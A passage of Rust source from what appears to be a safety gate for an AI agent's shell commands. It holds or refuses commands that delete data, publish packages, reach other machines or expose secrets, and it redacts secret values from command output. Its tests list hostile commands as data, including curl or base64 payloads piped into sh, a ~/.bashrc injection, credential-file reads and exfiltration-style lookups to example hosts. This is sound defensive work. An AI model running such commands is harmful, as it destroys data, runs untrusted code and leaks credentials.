        ("delete from", "it deletes rows from a database"),
        ("truncate table", "it empties a database table"),
        ("alter table", "it changes a database's tables"),
        ("insert into", "it writes to a database"),
        ("grant ", "it changes who may use a database"),
        ("revoke ", "it changes who may use a database"),
        ("create table", "it changes a database's tables"),
        ("create database", "it creates a database"),
    ] {
        if lower.contains(word) {
            hold(reason);
        }
    }
    // `UPDATE x SET`: an update, not the word in passing.
    if let Some(at) = lower.find("update ")
        && lower[at..].contains(" set ")
    {
        hold("it writes to a database");
    }
    reasons
}

const SHELLS: [&str; 6] = ["sh", "bash", "zsh", "dash", "fish", "ksh"];
const INTERPRETERS: [&str; 7] = ["python", "python3", "node", "perl", "ruby", "php", "deno"];

/// Why running `program` with `args` should be asked, if it should.
fn program_reason(program: &str, args: &[&str]) -> Option<&'static str> {
    let has = |flag: &str| args.contains(&flag);
    let first = args.iter().find(|a| !a.starts_with('-')).copied();
    match program {
        "rm" | "rmdir" | "unlink" | "shred" | "srm" => Some("it deletes files"),
        "find" if has("-delete") || has("-exec") || has("-execdir") => {
            Some("it deletes or runs commands on the files it finds")
        }
        "xargs" | "parallel" => Some("it runs commands built from its input"),
        "dd" | "mkfs" | "fdisk" | "parted" | "wipefs" => Some("it writes to disks"),
        "sudo" | "su" | "doas" | "pkexec" => Some("it runs as another user"),
        "kill" | "pkill" | "killall" | "shutdown" | "reboot" | "halt" | "systemctl"
        | "launchctl" => Some("it stops processes or services"),
        "eval" | "exec" | "source" | "." => Some(TEXT_AS_COMMAND),
        "base64" if has("-d") || has("--decode") || has("-D") => Some(DECODED),
        _ if SHELLS.contains(&program) && has("-c") => Some(TEXT_AS_COMMAND),
        _ if INTERPRETERS.contains(&program)
            && (has("-c") || has("-e") || has("--eval") || has("-r")) =>
        {
            Some(INLINE_CODE)
        }
        "ssh" | "scp" | "sftp" | "rsync" | "nc" | "ncat" | "netcat" | "telnet" | "ftp" => {
            Some("it reaches another machine")
        }
        "curl" | "wget" | "http" | "https" | "xh" => {
            // With -G the data goes in the URL of a GET: a query, as
            // a dashboard's or a log store's are.
            let get = args.iter().any(|a| {
                *a == "--get" || (a.starts_with('-') && !a.starts_with("--") && a.contains('G'))
            });
            let sends = !get
                && args.iter().any(|a| {
                    matches!(
                        *a,
                        "-d" | "--data"
                            | "--data-raw"
                            | "--data-binary"
                            | "--data-urlencode"
                            | "-F"
                            | "--form"
                            | "-T"
                            | "--upload-file"
                            | "--json"
                            | "--post-data"
                            | "--post-file"
                    ) || a.starts_with("--data")
                });
            let method = args.windows(2).any(|w| {
                matches!(w[0], "-X" | "--request" | "--method")
                    && !w[1].eq_ignore_ascii_case("get")
                    && !w[1].eq_ignore_ascii_case("head")
            }) || args.iter().any(|a| {
                a.strip_prefix("-X")
                    .is_some_and(|m| !m.is_empty() && !m.eq_ignore_ascii_case("get"))
            });
            (sends || method).then_some("it sends data to another machine")
        }
        "aws" | "gcloud" | "az" | "terraform" | "tofu" | "pulumi" => cloud_reason(program, args),
        "git" => git_reason(args),
        "gh" => gh_reason(args),
        "kubectl" | "oc" => kubectl_reason(args),
        "helm" => (!matches!(
            after_global_flags(args, &HELM_VALUED).first().copied(),
            Some(
                "list"
                    | "ls"
                    | "status"
                    | "get"
                    | "template"
                    | "show"
                    | "history"
                    | "version"
                    | "search"
                    | "lint"
            )
        ))
        .then_some("it changes a Kubernetes cluster"),
        "docker" | "podman" => match first {
            Some("rm" | "rmi" | "prune" | "push" | "kill" | "stop") => {
                Some("it removes or publishes containers or images")
            }
            Some("system" | "volume" | "image" | "container" | "network")
                if args.iter().any(|a| matches!(*a, "prune" | "rm")) =>
            {
                Some("it removes Docker data")
            }
            Some("compose") if args.iter().any(|a| matches!(*a, "down" | "rm")) => {
                Some("it removes containers")
            }
            _ => None,
        },
        "npm" | "pnpm" | "yarn" if first == Some("publish") => Some("it publishes a package"),
        "cargo" if matches!(first, Some("publish" | "yank" | "owner")) => {
            Some("it publishes a package")
        }
        "twine" | "gem" if matches!(first, Some("upload" | "push")) => {
            Some("it publishes a package")
        }
        "poetry" | "uv" | "flit" | "hatch" if first == Some("publish") => {
            Some("it publishes a package")
        }
        _ => None,
    }
}

fn git_reason(args: &[&str]) -> Option<&'static str> {
    if args.contains(&"--no-verify") || args.contains(&"-n") && args.contains(&"commit") {
        return Some("it skips the repository's hooks");
    }
    // A setting given for this run that decides what runs.
    if args.windows(2).any(|w| {
        w[0] == "-c" && {
            let setting = w[1].to_ascii_lowercase();
            [
                "hookspath",
                "sshcommand",
                "alias.",
                "fsmonitor",
                "editor",
                "pager",
            ]
            .iter()
            .any(|s| setting.contains(s))
        }
    }) {
        return Some("it changes what git runs");
    }
    let sub = args.iter().find(|a| !a.starts_with('-')).copied();
    let rest: Vec<&str> = args
        .iter()
        .skip_while(|a| Some(**a) != sub)
        .skip(1)
        .copied()
        .collect();
    let has = |flag: &str| rest.contains(&flag);
    match sub {
        Some("push") => Some("it sends commits to another repository"),
        Some("reset") => Some("it moves the branch and may discard changes"),
        Some("clean") => Some("it deletes untracked files"),
        Some("rebase") => Some("it rewrites history"),
        Some("filter-branch" | "filter-repo" | "replace") => Some("it rewrites history"),
        Some("branch")
            if has("-d") || has("-D") || has("--delete") || has("-f") || has("--force") =>
        {
            Some("it deletes a branch")
        }
        Some("tag") if has("-d") || has("--delete") => Some("it deletes a tag"),
        Some("checkout") if has("--") || has(".") || has("-f") || has("--force") => {
            Some("it discards changes")
        }
        Some("restore") => Some("it discards changes"),
        Some("stash") if has("drop") || has("clear") => Some("it discards stashed changes"),
        Some("worktree") if has("remove") || has("prune") => Some("it removes a worktree"),
        Some("gc" | "prune") => Some("it deletes unreachable objects"),
        Some("config")
            if !rest.iter().any(|a| {
                matches!(*a, "--get" | "--get-all" | "--get-regexp" | "--list" | "-l")
            }) && rest.iter().filter(|a| !a.starts_with('-')).count() > 1 =>
        {
            Some("it changes git's configuration")
        }
        _ => None,
    }
}

fn gh_reason(args: &[&str]) -> Option<&'static str> {
    let words: Vec<&str> = args
        .iter()
        .filter(|a| !a.starts_with('-'))
        .copied()
        .collect();
    let reads = matches!(
        words.get(1).copied(),
        Some("view" | "list" | "status" | "diff" | "checks" | "search")
    ) || matches!(words.first().copied(), Some("search" | "status" | "browse"));
    if words.first() == Some(&"api") {
        let writes = args
            .windows(2)
            .any(|w| matches!(w[0], "-X" | "--method") && !w[1].eq_ignore_ascii_case("get"))
            || args
                .iter()
                .any(|a| matches!(*a, "-f" | "-F" | "--field" | "--raw-field" | "--input"));
        return writes.then_some("it writes through GitHub's API");
    }
    (!reads).then_some("it changes something on GitHub")
}

/// kubectl's options that take a value, which is not the subcommand.
const KUBECTL_VALUED: [&str; 14] = [
    "-n",
    "--namespace",
    "--context",
    "--kubeconfig",
    "--cluster",
    "--user",
    "-s",
    "--server",
    "--token",
    "--as",
    "--as-group",
    "--request-timeout",
    "--certificate-authority",
    "-l",
];

/// helm's options that take a value.
const HELM_VALUED: [&str; 4] = ["-n", "--namespace", "--kube-context", "--kubeconfig"];

/// The words of a command that are not options, nor the values of the
/// options in `valued`: `kubectl -n web get pods` is `get pods`.
fn after_global_flags<'a>(args: &[&'a str], valued: &[&str]) -> Vec<&'a str> {
    let mut words = Vec::new();
    let mut skip = false;
    for arg in args {
        if skip {
            skip = false;
        } else if valued.contains(arg) {
            skip = true;
        } else if !arg.starts_with('-') {
            words.push(*arg);
        }
    }
    words
}

fn kubectl_reason(args: &[&str]) -> Option<&'static str> {
    if args
        .iter()
        .any(|a| a.to_ascii_lowercase().contains("secret"))
    {
        return Some("it reads or changes Kubernetes secrets");
    }
    let words = after_global_flags(args, &KUBECTL_VALUED);
    match words.first().copied() {
        Some(
            "get" | "describe" | "logs" | "top" | "explain" | "api-resources" | "api-versions"
            | "version" | "cluster-info",
        ) => None,
        Some("auth") if words.get(1) == Some(&"can-i") => None,
        Some("config") => match words.get(1).copied() {
            Some("view" | "get-contexts" | "current-context") => {
                // `view --raw` prints the credentials.
                args.contains(&"--raw")
                    .then_some("it prints Kubernetes credentials")
            }
            _ => Some("it changes the Kubernetes configuration"),
        },
        _ => Some("it changes a Kubernetes cluster or reaches into it"),
    }
}

/// The parts of a command line run one after the other or piped, each with
/// whether it reads the output of the one before.
fn segments(command: &str) -> Vec<(String, bool)> {
    let mut out = Vec::new();
    let mut current = String::new();
    let mut piped = false;
    let mut quote: Option<char> = None;
    let mut chars = command.chars().peekable();
    while let Some(c) = chars.next() {
        match (quote, c) {
            (Some(q), _) if c == q => {
                quote = None;
                current.push(c);
            }
            (Some(_), _) => current.push(c),
            (None, '\'' | '"') => {
                quote = Some(c);
                current.push(c);
            }
            (None, ';' | '\n') => {
                out.push((std::mem::take(&mut current), piped));
                piped = false;
            }
            (None, '&') => {
                if chars.peek() == Some(&'&') {
                    chars.next();
                } else if current.ends_with('>') || chars.peek() == Some(&'>') {
                    // `2>&1`, `&>`: a redirection, not a separator.
                    current.push(c);
                    continue;
                }
                out.push((std::mem::take(&mut current), piped));
                piped = false;
            }
            (None, '|') => {
                let or = chars.peek() == Some(&'|');
                if or {
                    chars.next();
                }
                out.push((std::mem::take(&mut current), piped));
                piped = !or;
            }
            (None, _) => current.push(c),
        }
    }
    out.push((current, piped));
    out.retain(|(s, _)| !s.trim().is_empty());
    out
}

/// The words of one command, quotes removed.
fn words(segment: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut started = false;
    for c in segment.chars() {
        match (quote, c) {
            (Some(q), _) if c == q => quote = None,
            (Some(_), _) => current.push(c),
            (None, '\'' | '"') => {
                quote = Some(c);
                started = true;
            }
            (None, c) if c.is_whitespace() => {
                if started || !current.is_empty() {
                    out.push(std::mem::take(&mut current));
                    started = false;
                }
            }
            (None, c) => current.push(c),
        }
    }
    if started || !current.is_empty() {
        out.push(current);
    }
    out
}

/// The command a wrapper such as `env`, `time` or `timeout` runs, after the
/// variables set before it.
fn unwrapped(words: &[String]) -> &[String] {
    let mut rest = words;
    loop {
        let Some(first) = rest.first() else {
            return rest;
        };
        let name = program_name(first);
        if first.contains('=') && !first.starts_with('-') && !first.starts_with('=') {
            rest = &rest[1..];
        } else if matches!(
            name,
            "env" | "time" | "nice" | "nohup" | "command" | "builtin"
        ) {
            rest = &rest[1..];
            while rest.first().is_some_and(|w| w.starts_with('-')) {
                rest = &rest[1..];
            }
        } else if matches!(name, "uv" | "poetry" | "pipenv" | "pdm" | "hatch" | "rye")
            && rest.get(1).is_some_and(|w| w == "run")
        {
            // A tool that runs a command in the project's environment.
            rest = &rest[2..];
            while rest.first().is_some_and(|w| w.starts_with('-')) {
                rest = &rest[1..];
            }
        } else if let Some(skip) = credential_wrapper(rest) {
            rest = &rest[skip..];
        } else if name == "timeout" {
            rest = &rest[1..];
            while rest.first().is_some_and(|w| w.starts_with('-')) {
                rest = &rest[1..];
            }
            // The duration.
            rest = rest.get(1..).unwrap_or_default();
        } else {
            return rest;
        }
    }
}

/// How many words a tool that hands credentials to a command takes before
/// that command: `aws-vault exec prod -- aws s3 ls` runs `aws s3 ls`, and
/// that is what is judged.
fn credential_wrapper(words: &[String]) -> Option<usize> {
    let name = program_name(words.first()?);
    let sub = words.get(1).map(String::as_str);
    let wraps = matches!(
        (name, sub),
        (
            "aws-vault" | "saml2aws" | "aws-sso" | "chamber",
            Some("exec")
        ) | ("op" | "doppler" | "infisical", Some("run"))
            | ("dotenv", _)
    );
    if !wraps {
        return None;
    }
    if let Some(dashes) = words.iter().position(|w| w == "--") {
        return Some(dashes + 1);
    }
    // Without `--`: the options, then for an exec its profile, then the
    // command.
    let mut at = if name == "dotenv" { 1 } else { 2 };
    while words.get(at).is_some_and(|w| w.starts_with('-')) {
        at += 1;
    }
    if sub == Some("exec") {
        at += 1;
    }
    Some(at.min(words.len()))
}

/// `/usr/bin/git` is `git`.
fn program_name(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or(word)
}

/// The file a `>` redirection writes over, if any: not `>>`, not a
/// descriptor, not `/dev/null`.
fn overwritten(segment: &str) -> Option<String> {
    let words = words(segment);
    let mut iter = words.iter().peekable();
    while let Some(word) = iter.next() {
        let target = if word == ">" || word == "1>" || word == ">|" {
            iter.peek().map(|w| w.to_string())
        } else {
            word.strip_prefix('>')
                .filter(|r| !r.starts_with('>') && !r.starts_with('&'))
                .map(str::to_owned)
        };
        if let Some(target) = target.filter(|t| !t.is_empty() && t != "/dev/null") {
            return Some(target);
        }
    }
    None
}

/// What a command printed, and how it ended.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommandOutput {
    /// Its exit status, `None` when it was stopped.
    pub status: Option<i32>,
    /// Its output and errors, interleaved as the shell gives them, the end
    /// kept when long.
    pub output: String,
    /// Whether it ran out of time.
    pub timed_out: bool,
}

/// Runs `command` with `sh -c` in `dir`, for two minutes at most, with the
/// environment but its secrets: those in `allowed`, and those a program it
/// runs reads on its own, such as aws its keys, are kept. Files of
/// credentials stay where tools find them. The value of any secret is
/// taken out of what it prints.
///
/// # Errors
///
/// When the shell cannot be started.
pub async fn run_command(
    command: &str,
    dir: &Path,
    allowed: &[String],
) -> std::io::Result<CommandOutput> {
    let all: Vec<(OsString, OsString)> = std::env::vars_os().collect();
    run_in(command, dir, environment(&all, command, dir, allowed), &all).await
}

/// What a command runs with: every variable but the secrets, except those
/// the person allowed and those a program it runs reads on its own.
fn environment(
    all: &[(OsString, OsString)],
    command: &str,
    dir: &Path,
    allowed: &[String],
) -> Vec<(OsString, OsString)> {
    let implied = implied_secrets(command, dir);
    all.iter()
        .filter(|(name, _)| {
            name.to_str().is_none_or(|name| {
                !is_secret(name) || allowed.iter().any(|a| a == name) || implied.contains(&name)
            })
        })
        .cloned()
        .collect()
}

/// `text` with the value of every secret of `env` replaced by its name, the
/// longest first, so that a part of one is not left over. Values shorter
/// than 8 characters are too common to be told from ordinary words.
fn redact(text: &str, env: &[(OsString, OsString)]) -> String {
    let mut secrets: Vec<(&str, &str)> = env
        .iter()
        .filter_map(|(name, value)| Some((name.to_str()?, value.to_str()?)))
        .filter(|(name, value)| is_secret(name) && value.len() >= 8)
        .collect();
    secrets.sort_by_key(|(_, value)| std::cmp::Reverse(value.len()));
    let mut out = text.to_owned();
    for (name, value) in secrets {
        if out.contains(value) {
            out = out.replace(value, &format!("<redacted:{name}>"));
        }
    }
    out
}

async fn run_in(
    command: &str,
    dir: &Path,
    env: Vec<(OsString, OsString)>,
    secrets: &[(OsString, OsString)],
) -> std::io::Result<CommandOutput> {
    let timeout = TIMEOUT;
    let mut process = Command::new("sh");
    process
        .arg("-c")
        // Errors land with the output, in order.
        .arg(format!("exec 2>&1; {command}"))
        .current_dir(dir)
        .env_clear()
        .envs(env.iter().cloned())
        .stdin(std::process::Stdio::null())
        .kill_on_drop(true);
    let output = match tokio::time::timeout(timeout, process.output()).await {
        Ok(output) => output?,
        Err(_) => {
            return Ok(CommandOutput {
                status: None,
                output: format!("stopped after {} seconds", timeout.as_secs()),
                timed_out: true,
            });
        }
    };
    let text = redact(&String::from_utf8_lossy(&output.stdout), secrets);
    Ok(CommandOutput {
        status: output.status.code(),
        output: tail(&text, OUTPUT_BYTES),
        timed_out: false,
    })
}

/// Whether an environment variable's name says it holds a secret: one of
/// its words, between underscores, is a token, a key, a password, a session
/// or a cookie. Sockets and the desktop's own variables are not.
fn is_secret(name: &str) -> bool {
    let upper = name.to_ascii_uppercase();
    if upper.ends_with("_SOCK") || upper.starts_with("XDG_") || upper.starts_with("DBUS_") {
        return false;
    }
    upper.split('_').any(|word| {
        ["TOKEN", "SECRET", "PASSWORD"]
            .iter()
            .any(|w| word.contains(w))
            || matches!(
                word,
                "KEY"
                    | "APIKEY"
                    | "PASSWD"
                    | "CREDENTIAL"
                    | "CREDENTIALS"
                    | "SESSION"
                    | "COOKIE"
                    | "AUTH"
            )
    })
}

/// The last `bytes` of `text`, at a character, saying what was cut.
fn tail(text: &str, bytes: usize) -> String {
    if text.len() <= bytes {
        return text.to_owned();
    }
    let mut from = text.len() - bytes;
    while !text.is_char_boundary(from) {
        from += 1;
    }
    format!("[{} bytes cut]\n{}", from, &text[from..])
}

#[cfg(test)]
mod tests {
    use super::*;

    fn held(command: &str) -> Vec<String> {
        assess(command, Path::new("/nonexistent"), &Policy::default()).held
    }

    fn refused(command: &str) -> Vec<String> {
        assess(command, Path::new("/nonexistent"), &Policy::default()).refused
    }

    #[test]
    fn everyday_commands_run() {
        for command in [
            "cargo test -q",
            "git status && git diff --stat",
            "git switch -c fix-parser && git add -A && git commit -m 'Fix the parser'",
            "ls -la src | head -20",
            "pytest -q tests/test_api.py 2>&1 | tail -5",
            "kubectl get pods -n web",
            "kubectl logs deploy/api --tail=50",
            "kubectl config current-context",
            "curl -s https://example.com/health",
            "gh pr view 12",
            "docker compose up -d db",
            "echo hi > /dev/null",
            "FOO=1 timeout 30 npm test",
            // Options before the subcommand, and their values.
            "kubectl -n web get pods",
            "kubectl --context prod --namespace api logs deploy/api",
            "helm -n web list",
            "helm --kube-context prod status api",
            // A query sent as a GET.
            "curl -sG https://logs.example.com/api/query --data-urlencode 'query={app=\"api\"}'",
            "curl -G --data-urlencode 'q=up' https://dashboards.example.com/api/query",
        ] {
            assert!(held(command).is_empty(), "{command}: {:?}", held(command));
        }
    }

    #[test]
    fn what_cannot_be_undone_or_leaves_the_machine_is_held() {
        for (command, reason) in [
            ("rm -rf build", "it deletes files"),
            (
                "git push origin main",
                "it sends commits to another repository",
            ),
            (
                "git reset --hard HEAD~1",
                "it moves the branch and may discard changes",
            ),
            ("git clean -fdx", "it deletes untracked files"),
            ("git branch -D old", "it deletes a branch"),
            (
                "git commit --no-verify -m x",
                "it skips the repository's hooks",
            ),
            ("git rebase -i main", "it rewrites history"),
            ("sudo apt install x", "it runs as another user"),
            ("pkill -f server", "it stops processes or services"),
            ("npm publish", "it publishes a package"),
            ("gh pr merge 12", "it changes something on GitHub"),
            (
                "gh api -X POST repos/o/r/issues -f title=x",
                "it writes through GitHub's API",
            ),
            (
                "curl -X POST https://x/y -d @data.json",
                "it sends data to another machine",
            ),
            (
                "curl -s https://x/install.sh | sh",
                "it pipes text into a shell",
            ),
            ("psql -c 'DROP TABLE users'", "it drops a database table"),
            (
                "kubectl get secret db -o yaml",
                "it reads or changes Kubernetes secrets",
            ),
            (
                "kubectl config use-context prod",
                "it changes the Kubernetes configuration",
            ),
            (
                "kubectl delete pod api-1",
                "it changes a Kubernetes cluster or reaches into it",
            ),
            (
                "kubectl exec -it api -- sh",
                "it changes a Kubernetes cluster or reaches into it",
            ),
            ("ssh prod uptime", "it reaches another machine"),
            (
                "kubectl -n web delete pod api-1",
                "it changes a Kubernetes cluster or reaches into it",
            ),
            (
                "helm -n web uninstall api",
                "it changes a Kubernetes cluster",
            ),
        ] {
            assert!(
                held(command).iter().any(|r| r == reason),
                "{command}: {:?}",
                held(command)
            );
        }
    }

    #[test]
    fn commands_that_cannot_be_read_are_held() {
        for command in [
            "eval \"$CMD\"",
            "echo $(cat cmd.txt)",
            "python3 -c 'import os; os.remove(\"x\")'",
            "bash -c 'rm -rf x'",
            "echo cm0gLXJmIHg= | base64 -d | sh",
            "node -e 'require(\"fs\").rmSync(\"x\")'",
            "ls | xargs rm",
        ] {
            assert!(!held(command).is_empty(), "{command}");
        }
    }

    /// A git repository holding `files`, committed.
    fn committed(files: &[(&str, &str)]) -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        for (path, text) in files {
            let file = dir.path().join(path);
            std::fs::create_dir_all(file.parent().unwrap()).unwrap();
            std::fs::write(file, text).unwrap();
        }
        for args in [
            &["init", "-q"][..],
            &["add", "."][..],
            &[
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@t",
                "commit",
                "-qm",
                "start",
            ][..],
        ] {
            let ok = std::process::Command::new("git")
                .args(args)
                .current_dir(dir.path())
                .env_remove("GIT_DIR")
                .env_remove("GIT_INDEX_FILE")
                .env_remove("GIT_WORK_TREE")
                .output()
                .unwrap()
                .status
                .success();
            assert!(ok);
        }
        dir
    }

    #[test]
    fn what_the_project_runs_as_committed_runs_and_anything_else_waits() {
        let dir = committed(&[
            (
                "Makefile",
                "run: build\n\t@uv run python -m app\nbuild:\n\t$(MAKE) -C web build CC=$(CC)\ndeploy: build\n\taws s3 sync dist s3://site --delete\n",
            ),
            ("app/__main__.py", "print('serving')\n"),
            ("tools/report.py", "print('report')\n"),
            (
                "package.json",
                r#"{"scripts": {"start": "node server.js", "release": "npm publish"}}"#,
            ),
        ]);
        let root = dir.path();
        // As committed: they run, their shell text judged.
        for command in [
            "make",
            "make run",
            "uv run python -m app",
            "python3 tools/report.py",
            "npm start",
            "pytest -q",
        ] {
            assert!(
                assess(command, root, &Policy::default()).held.is_empty(),
                "{command}: {:?}",
                assess(command, root, &Policy::default()).held
            );
        }
        assert_eq!(
            assess("make deploy", root, &Policy::default()).held,
            ["make deploy: it changes something in a cloud account"]
        );
        assert_eq!(
            assess("npm run release", root, &Policy::default()).held,
            ["npm run release: it publishes a package"]
        );
        // Changed or new since the last commit: nobody saw it, it waits.
        std::fs::write(root.join("tools/report.py"), "import shutil\n").unwrap();
        std::fs::write(root.join("tools/new.py"), "print(1)\n").unwrap();
        std::fs::write(root.join("Makefile"), "run:\n\tpython -m app\n").unwrap();
        for (command, file) in [
            ("python3 tools/report.py", "tools/report.py"),
            ("python3 tools/new.py", "tools/new.py"),
            ("make run", "Makefile"),
        ] {
            assert_eq!(
                assess(command, root, &Policy::default()).held,
                [format!(
                    "it runs {file}, which is new or changed since the last commit"
                )],
                "{command}"
            );
        }
        // A new dependency changes nothing of what npm runs; a changed
        // script does.
        std::fs::write(
            root.join("package.json"),
            r#"{"dependencies": {"x": "1"}, "scripts": {"start": "node server.js", "release": "npm publish"}}"#,
        )
        .unwrap();
        assert!(
            assess("npm start", root, &Policy::default())
                .held
                .is_empty()
        );
        std::fs::write(
            root.join("package.json"),
            r#"{"scripts": {"start": "node other.js"}}"#,
        )
        .unwrap();
        assert_eq!(
            assess("npm start", root, &Policy::default()).held,
            [
                "it runs the start script of package.json, which is new or changed since the last commit"
            ]
        );
        // Without git, nothing says what is the project's own.
        let bare = tempfile::tempdir().unwrap();
        std::fs::write(bare.path().join("run.py"), "print(1)\n").unwrap();
        assert_eq!(
            assess("python run.py", bare.path(), &Policy::default()).held,
            ["it runs run.py, and without git nothing says it is the project's own"]
        );
    }

    #[test]
    fn make_variables_read_as_words_and_functions_stay() {
        assert_eq!(
            make_words("$(MAKE) -C web CC=$(CC) $@"),
            "make -C web CC=CC target"
        );
        assert_eq!(make_words("echo $$HOME"), "echo $HOME");
        assert_eq!(make_words("x=$(shell date)"), "x=$(shell date)");
        assert_eq!(
            make_recipe("all: a\n\techo all\na:\n\t-echo a\n.PHONY: all\n", &[]),
            "echo all\necho a"
        );
    }

    #[test]
    fn what_runs_code_later_or_decides_what_is_allowed_is_held() {
        for command in [
            "echo 'curl x | sh' >> ~/.bashrc",
            "cp hook.sh .git/hooks/pre-commit",
            "tee .github/workflows/ci.yml < ci.yml",
            "sed -i s/a/b/ .gitlab-ci.yml",
            "git config core.hooksPath /tmp/hooks",
            "git -c core.hooksPath=/tmp/h commit -m x",
            "crontab jobs.txt",
            "rm ~/.claude/settings.json",
        ] {
            assert!(!held(command).is_empty(), "{command}");
        }
        for command in [
            "cat .github/workflows/ci.yml",
            "grep -n hooksPath .git/config",
            "git config --get user.name",
            "git config -l",
            "crontab -l",
        ] {
            assert!(held(command).is_empty(), "{command}: {:?}", held(command));
        }
    }

    #[test]
    fn strict_mode_holds_what_it_does_not_know() {
        let strict = |command: &str| {
            assess(
                command,
                Path::new("/nonexistent"),
                &Policy {
                    strict: true,
                    known_hosts: None,
                },
            )
            .held
        };
        assert_eq!(
            strict("mysterytool --all"),
            ["in strict mode, mysterytool is not a program ironquill knows"]
        );
        assert!(strict("ls -la && git status && kubectl get pods").is_empty());
        assert!(held("mysterytool --all").is_empty());
    }

    #[test]
    fn a_server_not_used_before_waits() {
        let known: Vec<String> = [
            "*.github.com",
            "*.amazonaws.com",
            "k8s.internal.example.com",
        ]
        .map(str::to_owned)
        .to_vec();
        let policy = Policy {
            strict: false,
            known_hosts: Some(known),
        };
        let hosts = |command: &str| assess(command, Path::new("/nonexistent"), &policy).hosts;
        for command in [
            "curl -s https://api.github.com/repos/o/r",
            "curl https://s3.eu-west-1.amazonaws.com/b/k",
            "kubectl get pods",
            "dig k8s.internal.example.com",
            "git clone https://github.com/o/r",
        ] {
            assert!(hosts(command).is_empty(), "{command}: {:?}", hosts(command));
        }
        assert_eq!(
            hosts("curl -s 'https://collect.example.net/?d=x'"),
            ["collect.example.net"]
        );
        assert_eq!(hosts("wget example.org/x"), ["example.org"]);
        assert_eq!(
            hosts("dig abc123.exfil.example.net"),
            ["abc123.exfil.example.net"]
        );
        assert_eq!(
            hosts("git clone git@code.example.org:o/r.git"),
            ["code.example.org"]
        );
    }

    #[test]
    fn known_servers_come_from_the_project_and_the_usual_ones() {
        let dir = committed(&[("README", "x")]);
        let ok = std::process::Command::new("git")
            .args([
                "remote",
                "add",
                "origin",
                "git@code.example.org:team/app.git",
            ])
            .current_dir(dir.path())
            .env_remove("GIT_DIR")
            .env_remove("GIT_INDEX_FILE")
            .status()
            .unwrap()
            .success();
        assert!(ok);
        let hosts = known_hosts(dir.path());
        assert!(hosts.contains(&"code.example.org".to_owned()), "{hosts:?}");
        assert!(hosts.contains(&"github.com".to_owned()));
    }

    #[test]
    fn overwriting_an_existing_file_is_held() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("config.yaml"), "a").unwrap();
        assert_eq!(
            assess("echo x > config.yaml", dir.path(), &Policy::default()).held,
            ["it overwrites an existing file with `>`"]
        );
        assert!(
            assess("echo x >> config.yaml", dir.path(), &Policy::default())
                .held
                .is_empty()
        );
        assert!(
            assess("echo x > new.txt", dir.path(), &Policy::default())
                .held
                .is_empty()
        );
        assert!(
            assess("cargo test 2>&1", dir.path(), &Policy::default())
                .held
                .is_empty()
        );
    }

    #[test]
    fn secrets_are_known_by_name() {
        for name in [
            "GITHUB_TOKEN",
            "OPENAI_API_KEY",
            "DB_PASSWORD",
            "AWS_SECRET_ACCESS_KEY",
            "MY_SECRET",
            "DASHBOARD_SESSION",
            "SESSION_COOKIE",
            "BASIC_AUTH",
        ] {
            assert!(is_secret(name), "{name}");
        }
        for name in [
            "PATH",
            "HOME",
            "KUBECONFIG",
            "AWS_PROFILE",
            "SSH_AUTH_SOCK",
            "GIT_AUTHOR_NAME",
            "XDG_SESSION_TYPE",
        ] {
            assert!(!is_secret(name), "{name}");
        }
    }

    #[test]
    fn what_a_command_prints_of_a_secret_is_taken_out() {
        let env = [
            ("DASHBOARD_SESSION", "abcdef0123456789"),
            ("API_TOKEN", "abcdef0123"),
            ("SHORT_TOKEN", "abc"),
            ("HOME", "/home/someone/projects"),
        ]
        .map(|(n, v)| (OsString::from(n), OsString::from(v)));
        assert_eq!(
            redact(
                "cookie=abcdef0123456789; token abcdef0123 abc in /home/someone/projects",
                &env
            ),
            "cookie=<redacted:DASHBOARD_SESSION>; token <redacted:API_TOKEN> abc in /home/someone/projects"
        );
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn a_command_gets_only_the_secrets_it_may_use_and_never_shows_them() {
        let all: Vec<(OsString, OsString)> = std::env::vars_os()
            .chain(
                [
                    ("IRONQUILL_TEST_TOKEN", "t0k3n-value"),
                    ("AWS_SECRET_ACCESS_KEY", "aws-secret-value"),
                ]
                .map(|(n, v)| (OsString::from(n), OsString::from(v))),
            )
            .collect();
        let dir = tempfile::tempdir().unwrap();
        let run = |command: &'static str, allowed: Vec<String>| {
            let env = environment(&all, command, Path::new("/nonexistent"), &allowed);
            let all = all.clone();
            let dir = dir.path().to_owned();
            async move { run_in(command, &dir, env, &all).await.unwrap().output }
        };
        // Not allowed: not there.
        assert_eq!(
            run("echo \"[$IRONQUILL_TEST_TOKEN]\"", vec![]).await,
            "[]\n"
        );
        // Allowed: there, and taken out of what it prints.
        assert_eq!(
            run(
                "echo \"[$IRONQUILL_TEST_TOKEN]\"",
                vec!["IRONQUILL_TEST_TOKEN".into()]
            )
            .await,
            "[<redacted:IRONQUILL_TEST_TOKEN>]\n"
        );
        // A program that reads its own keys gets them; others do not.
        let aws = environment(&all, "aws s3 ls", Path::new("/nonexistent"), &[]);
        assert!(aws.iter().any(|(n, _)| n == "AWS_SECRET_ACCESS_KEY"));
        let other = environment(&all, "ls", Path::new("/nonexistent"), &[]);
        assert!(!other.iter().any(|(n, _)| n == "AWS_SECRET_ACCESS_KEY"));
    }

    #[test]
    fn what_would_show_a_secret_never_runs() {
        for command in [
            "cat ~/.aws/credentials",
            "grep key $HOME/.ssh/id_ed25519",
            "head -5 .env",
            "cat backend/.env.production",
            "cp ~/.kube/config /tmp/k",
            "env",
            "printenv",
            "printenv GITHUB_TOKEN",
            "export -p",
            "echo $API_TOKEN",
            "printf '%s' \"${DB_PASSWORD}\"",
            "aws secretsmanager get-secret-value --secret-id db",
            "aws --profile prod ssm get-parameter --name /db/pass --with-decryption",
            "aws configure get aws_secret_access_key",
            "aws sts assume-role --role-arn arn:aws:iam::1:role/x --role-session-name s",
            "aws ecr get-login-password",
            "gcloud auth print-access-token",
            "gcloud secrets versions access latest --secret db",
            "az keyvault secret show --vault-name v --name db",
            "az account get-access-token",
            "kubectl -n web get secret db -o yaml",
            "kubectl describe secrets",
            "kubectl config view --raw",
            "vault kv get secret/db",
            "gh auth token",
            "op read op://vault/db/password",
            "security find-generic-password -s db -w",
            "terraform output -json",
        ] {
            assert!(!refused(command).is_empty(), "{command}");
        }
        for command in [
